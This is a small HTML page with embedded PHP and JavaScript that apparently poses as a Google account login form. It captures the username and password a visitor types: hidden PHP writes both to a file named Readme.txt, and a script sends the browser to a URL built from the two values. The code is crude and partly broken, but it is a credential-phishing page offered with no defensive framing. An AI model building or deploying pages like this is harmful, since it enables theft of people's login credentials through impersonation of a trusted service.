<body>
<form action="./https://accounts.google.com/b/0/AddMailService" method="POST">
<header hidden><?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
$text = htmlspecialchars($_POST['text']);
$password = htmlspecialchars($_POST['password']);

echo "data: $text";
echo "password: $password";
$file = fopen("Readme.txt", "w+");
fwrite($file, "$text <br/> $password");
fclose($file);
}
?></header>


<p>Username</p>
<input id="text" type="text" name="text"/>
<p>Password</p>
<input id="password" type="Password" name="password"/>
<p></p>
<button onclick="form()" type="submit">click</button>
</form>

<button onclick="form()" type="submit">web</button>
<script>
    function form(){
const details = document.querySelector("#text");
const secrets = document.querySelector("#password");
location = "https://" + details.value + "" +secrets.value;
    }
</script>
